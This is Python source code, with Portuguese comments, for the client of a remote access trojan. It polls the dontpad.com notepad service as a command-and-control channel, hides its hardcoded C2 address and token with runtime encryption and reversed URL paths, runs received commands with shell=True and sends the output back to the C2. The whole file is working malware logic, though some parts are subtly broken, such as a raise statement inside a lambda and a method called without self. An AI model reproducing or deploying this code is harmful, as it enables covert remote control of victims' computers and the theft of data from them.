import requests
import time
import subprocess
from observer import Observer
import getpass
from criptographer import Criptographer
from Crypto.Cipher import AES
import base64
import os
import random
import string

# Funções de encryptação e decryptação
def encrypt_string(s):
    key = os.urandom(16)  # Gere uma chave aleatória de 16 bytes
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(s.encode('utf-8'))
    return base64.b64encode(nonce + ciphertext).decode('utf-8'), base64.b64encode(key).decode('utf-8')

def decrypt_string(encrypted, key):
    key = base64.b64decode(key)
    encrypted = base64.b64decode(encrypted)
    nonce = encrypted[:16]
    ciphertext = encrypted[16:]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt(ciphertext).decode('utf-8')

# Encryptando strings sensíveis
encrypted_base_url, base_url_key = encrypt_string("https://api.dontpad.com")
encrypted_pad_name, pad_name_key = encrypt_string("yaguinhofodinha")
encrypted_session_token, session_token_key = encrypt_string("-25751fc88e6e559870fd")

def obsfuscate_url(path, params):
    # Exemplo de obsfuscação: inverter a string e adicionar um sufixo aleatório
    obsfuscated_path = path[::-1] + ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    obsfuscated_params = {k[::-1]: v for k, v in params.items()}
    return obsfuscated_path, obsfuscated_params

def switch_case(value, cases):
    return cases.get(value, cases.get(None, lambda: None))()

class Client:
    def __init__(self, url):
        self.url = url
        self.command = ''
        self.result = ''
        self.first_run = True
        self.username = getpass.getuser()

    def init_dontpad(self):
        data = {
            "text": Criptographer.encrypt('whoami', getpass.getuser()),
            "lastModified": int(time.time() * 1000),
            "force": "true",
            "session-token": decrypt_string(encrypted_session_token, session_token_key)
        }
        obsfuscated_path, obsfuscated_params = obsfuscate_url(f"/{decrypt_string(encrypted_pad_name, pad_name_key)}/{getpass.getuser()}/request", data)
        requests.post(f"{decrypt_string(encrypted_base_url, base_url_key)}{obsfuscated_path}", params=obsfuscated_params)

    def start(self, command_body):
        print("Comando recebido:\n", Criptographer.decrypt(command_body, self.username))
        if self.first_run:
            self.first_run = False
            self.init_dontpad()
            self.send_result_to_c2()

        self.execute_command(command_body)

    def execute_command(self, command_body):
        self.command = Criptographer.decrypt(command_body, self.username).strip()
        handle_command(self.command)

    def handle_command(self, command):
        cases = {
            'whoami': lambda: print("Executando whoami"),
            'exit': lambda: raise SystemExit(0),
            None: lambda: print("Comando desconhecido")
        }
        return switch_case(command, cases)

    def execute(self):
        try:
            processo = subprocess.Popen(
                self.command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="ignore"
            )
            stdout, stderr = processo.communicate(timeout=20)
            if stderr:
                return f"Erro na execução do comando: {stderr}"
            return stdout.replace("�", "")
        except Exception as e:
            return f"Erro na execução do comando: {e}"

    def send_result_to_c2(self):
        data = {
            "text": Criptographer.encrypt(self.result, self.username),
            "lastModified": int(time.time() * 1000),
            "force": "true",
            "session-token": decrypt_string(encrypted_session_token, session_token_key)
        }
        obsfuscated_path, obsfuscated_params = obsfuscate_url(f"/{decrypt_string(encrypted_pad_name, pad_name_key)}/{getpass.getuser()}/response", data)
        print(f'Sending result to C2: {data}')
        res = requests.post(f"{decrypt_string(encrypted_base_url, base_url_key)}{obsfuscated_path}", params=obsfuscated_params)
        print(res.status_code, res.url)

if __name__ == "__main__":
    username = getpass.getuser()

    obsfuscated_url_with_username, obsfuscated_params_with_username = obsfuscate_url(f"/{decrypt_string(encrypted_pad_name, pad_name_key)}/{username}/request.body.json", {"lastModified": 0, "session-token": decrypt_string(encrypted_session_token, session_token_key)})
    obsfuscated_first_url, obsfuscated_first_params = obsfuscate_url(f"/{decrypt_string(encrypted_pad_name, pad_name_key)}/request.body.json", {"lastModified": 0, "session-token": decrypt_string(encrypted_session_token, session_token_key)})

    client = Client(url=f"{decrypt_string(encrypted_base_url, base_url_key)}{obsfuscated_url_with_username}")
    observer = Observer(first_url=f"{decrypt_string(encrypted_base_url, base_url_key)}{obsfuscated_first_url}", url_with_username=f"{decrypt_string(encrypted_base_url, base_url_key)}{obsfuscated_url_with_username}", client=client, params_with_username=obsfuscated_params_with_username, first_params=obsfuscated_first_params)
    observer.start()